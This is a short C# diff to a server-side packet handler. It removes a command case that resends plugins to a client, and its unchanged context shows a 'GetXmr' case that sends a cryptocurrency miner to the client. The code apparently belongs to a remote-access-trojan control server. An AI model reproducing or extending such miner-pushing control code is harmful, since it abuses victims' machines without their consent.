@@ -176,12 +176,6 @@ namespace Server.Handle_Packet
                                 break;
                             }
 
-                        case "sendPlugin+":
-                            {
-                                client.ReSendPAlllugins();
-                                break;
-                            }
-
                         case "GetXmr":
                             {
                                 new HandleMiner().SendMiner(client);
